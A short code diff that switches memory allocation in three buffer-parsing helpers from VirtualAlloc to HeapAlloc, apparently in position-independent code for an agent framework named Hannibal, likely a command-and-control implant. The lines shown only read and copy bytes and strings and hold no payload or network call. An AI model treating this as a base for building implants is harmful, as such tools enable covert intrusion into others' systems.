@@ -94,7 +94,7 @@ SECTION_CODE UINT8* ReadBytes(UINT8 **buffer, UINT32 length)
 {
     HANNIBAL_INSTANCE_PTR
 
-    UINT8* bytes = (UINT8*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    UINT8* bytes = (UINT8*)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, length);
     if (!bytes) return NULL;
 
     pic_memcpy(bytes, *buffer, length);
@@ -118,8 +118,8 @@ SECTION_CODE PCHAR ReadString(UINT8 **buffer, UINT32 length)
     while ((*buffer)[str_len] != '\0'){
         str_len++;
     }
-    
-    PCHAR str = (PCHAR)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, str_len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    PCHAR str = (PCHAR)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, str_len + 1);
     if (!str) return NULL;
     pic_memcpy(str, *buffer, str_len + 1);
     *buffer += str_len + 1;
@@ -140,7 +140,7 @@ SECTION_CODE PWCHAR ReadStringW(UINT8 **buffer, UINT32 length)
         str_len++;
     }
     
-    PWCHAR str = (PWCHAR)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, (str_len + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    PWCHAR str = (PWCHAR)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, (str_len + 1) * sizeof(WCHAR));
     if (!str) return NULL;
     pic_memcpy(str, *buffer, (str_len + 1) * sizeof(WCHAR));
     *buffer += (str_len + 1) * sizeof(WCHAR);
